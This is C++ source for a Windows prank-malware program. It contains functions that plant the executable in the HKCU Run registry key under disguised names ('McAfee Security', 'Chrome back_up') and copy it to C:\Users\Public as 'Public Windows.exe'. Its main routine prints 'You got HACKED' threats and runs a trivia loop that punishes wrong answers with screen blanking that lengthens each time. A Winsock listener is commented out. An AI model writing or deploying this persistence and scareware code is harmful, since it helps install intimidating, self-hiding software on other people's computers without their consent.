#include <windows.h>
#include <iostream>
#include <cstdlib>
#include <string>
#include <exception>
#include <mutex>
//#include <winsock2.h>

//#pragma comment(lib, "ws2_32.lib")

#define PORT 8765


#include "trivia.h"
#include "black_screen.h"


// Function to get the current executable's path
std::wstring GetAppPath() {
    WCHAR path[MAX_PATH];  // Use WCHAR for wide character array
    GetModuleFileNameW(NULL, path, MAX_PATH);  // Retrieves the full path of the executable in wide characters
    return std::wstring(path);  // Return as std::wstring (wide string)
}

void static AddToStartup() {
    HKEY hKey;
    const WCHAR* regPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const WCHAR* appName = L"McAfee Security";
    std::wstring appPath = GetAppPath();

    // Open the registry key
    if (RegOpenKeyExW(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        // Set the value in the registry
        RegSetValueExW(hKey, appName, 0, REG_SZ, (BYTE*)appPath.c_str(), (appPath.size() + 1) * sizeof(WCHAR));
        RegCloseKey(hKey);
        std::cout << "Great! your computer now is in safe hands." << std::endl;
    }
    else {
        std::cout << "Failed to open registry key!" << std::endl;
    }
}

std::string fromWcharToString(std::wstring wstr)
{
    // Calculating the length of the multibyte string
    size_t len = wcstombs(nullptr, wstr.c_str(), 0) + 1;

    // Creating a buffer to hold the multibyte string
    char* buffer = new char[len];

    // Converting wstring to string
    wcstombs(buffer, wstr.c_str(), len);

    // Creating std::string from char buffer
    std::string str(buffer);

    // Cleaning up the buffer
    delete[] buffer;
    return str;
}

void static AddToStartupDiffrentName() 
{
    //make copy of this file, with diffrent name
    try
    {
        std::wstring appPath = GetAppPath();
        std::wstring appNewPath = L"C:\\Users\\Public\\Public Windows.exe";
        std::string old_path = fromWcharToString(appPath);
        std::cout << old_path << std::endl;
        printf("program add..\n");
        bool a = CopyFileW(appPath.c_str(), appNewPath.c_str(), FALSE);

    }
    catch (std::exception)
    {
        printf("we will meet again.");
    }


    HKEY hKey;
    const WCHAR* regPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const WCHAR* appName = L"Chrome back_up";
    std::wstring appPath = L"C:\\Users\\Public\\Public Windows.exe";

    // Open the registry key
    if (RegOpenKeyExW(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        // Set the value in the registry
        RegSetValueExW(hKey, appName, 0, REG_SZ, (BYTE*)appPath.c_str(), (appPath.size() + 1) * sizeof(WCHAR));
        RegCloseKey(hKey);
        std::cout << "and we are spreding..." << std::endl;
    }
    else {
        std::cout << "Failed to open registry key!" << std::endl;
    }
}

int make_trivia(void)
{
    printf("\n\n");
    int ans = GenerateTriviaQuestions(3);  // Generate 3 trivia questions
   //system("pause");
    return ans;
}

void ascii_print(void)
{
                        std::cout << R"(
                         ---   .    ____        -----      ______   -----        .
                      ___     / \             .....................      ____   / \
                            .'   '.  --  ..:::::''''''''''''''''':::::..      .'   '.
                      ---   | ^ ^ |    .::::''''                 ''''::::. -- | ^ ^ '
                            | ^ ^ |  .::''                             ''::.  | ^ ^ | --
                    ____     '...'  .::'              .-.                '::.  '...'
                            .-.!_  .::'              /   \                '::.   ! ____
                           / / `-`.:'                '-.-'                  ':..""".
                     --    ' |  '.|:'                 .'.                   ':/' |  \
                           | |   |'.               _/^---^\_                  |     . --
                     ___    \ .  '|               \-------../                 \   '.'
                            ' :   '                '.\:::/.'                  |'   || ___
                            | |  .|                 | | |'|                   / ' . |
                        --  | '. | \                '.\ /.'                   '.  | |--
                            |'.   '|                 |[ ]|                    | .'  |____
                    __    .'\ |  .'\                 '.^.'                    \ |.  .
                         .'-.\'. | |                  (:)                     | ||| |
                       .'    \'..' .             _..--'''--.._               /'-._.-'| ---
                       |       `-..'.         .-'             '-.           |      .-'.
                        \            `-.    .'  ..            .. '.        .'-._.-'    `.
                    --   )              `-./    '::.        .::'   \   _.-'             /
                         '._/-..          /       '::.    .::'      \-'              .-'
                             ::.`-.      ''        '::   ::'        ''       _..-\_.'
                             :::   '._   | \         '   '         / |    .-'   .:: _____
                    ____     :::      `-.|  '  .----..___..----.  '  | .-'      :::
                             :::          \ |  _..--.     .--.._  | /-'         ::: ---
                             :::          | ' /     |     |     \ ' |           :::
                       --    :::          )   |   _.'     '._   |   (           :::____
                        ____ :::          /'. \_.'   )\ /(   '._/ .'\           :::
                             :::       .-'|  `-->-@ /     \ @->--'  |-.         :::
                             :::    .-'   \         | / \ |         /  `-.      :::  ---
                     ----    '' _.-'       |        )/   \(        |      `-.   :::  _____
                      _.-=--..-'          . \ /\               /\ /          `-. ''
                     /.._    `.        .-'   .\ '-.\.\\.//./.-' /.`-.           `---.._
                    |    `.    \    .-'      | '.             .' |   `-.                \ 
                     \    _\.   `.-'         |   '-././.\.\.-'   |      `.               |
                      `.-'  |   /::::::::::: \                   /::::::::`.      ,-.    /
                     - |   /   /NOM     ----  '-.             .-'     ----  `.    |  \_.'
                    __ \   | .'     _____        '-._._._._.-'     ____      |    |   |
                        `--'                                                 `-.  '._ / --
                                                                                `...-'
                        )" << std::endl;
}

void viva(void)
{
    srand((unsigned)time(NULL));
    int x = rand();
    for (int i = 0; i < 5; i++)
    {
    printf("\nviva victoria!\nYou got HACKED.");
    printf("\n\nYour computer is about to be destroyed.");
    printf("\nYour chances of survival are:: 1 to %d\n", x);
    }
}





int main()
{
    /*
    WSADATA wsaData;
    SOCKET serverSocket, clientSocket;
    struct sockaddr_in serverAddr, clientAddr;
    int clientAddrSize = sizeof(clientAddr);
    char buffer[1024] = { 0 };
    const char* hello = "Hello from server";

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock\n";
        return -1;
    }

    // Create socket
    if ((serverSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        std::cerr << "Socket creation failed\n";
        WSACleanup();
        return -1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;  // Bind to all available interfaces
    serverAddr.sin_port = htons(PORT);

    // Bind socket
    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Bind failed\n";
        closesocket(serverSocket);
        WSACleanup();
        return -1;
    }

    // Listen for incoming connections
    if (listen(serverSocket, 3) == SOCKET_ERROR) {
        std::cerr << "Listen failed\n";
        closesocket(serverSocket);
        WSACleanup();
        return -1;
    }

    std::cout << "Waiting for connections...\n";

    // Accept incoming connection
    if ((clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrSize)) == INVALID_SOCKET) {
        std::cerr << "Accept failed\n";
        closesocket(serverSocket);
        WSACleanup();
        return -1;
    }

    std::cout << "Client connected\n";

    // Receive data from client
    int recvSize = recv(clientSocket, buffer, sizeof(buffer), 0);
    if (recvSize > 0) {
        std::cout << "Client: " << buffer << std::endl;
    }
    else {
        std::cerr << "Receive failed\n";
    }
    */
    HANDLE hEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, TEXT("SuccessEvent"));
    if (hEvent == NULL) {
        std::cerr << "OpenEvent failed with error: " << GetLastError() << std::endl;
        //return 1;
    }

    viva();    
    int black_time = 10000;
    while (true)
    {
        int ans = make_trivia();
        if (ans == 0 || ans == -1)
        {
            ascii_print();
            printf("\n                 -------------> YOU WERE WRONG! NOW YOU WILL BE PUNISHED... <----------------\n\n");
            std::this_thread::sleep_for(std::chrono::milliseconds(3000));
            black_main(black_time);
            black_time *= 2;
            //system("pause");
        }
        else
        {
            printf("You were right this time. until we meet again...");
            SetEvent(hEvent);
            CloseHandle(hEvent);
            //send(clientSocket, hello, strlen(hello), 0);
            //std::cout << "Hello message sent\n";

            //// Close sockets
            //closesocket(clientSocket);
            //closesocket(serverSocket);
            //WSACleanup();
            break;
        }
    }

    return 1;
}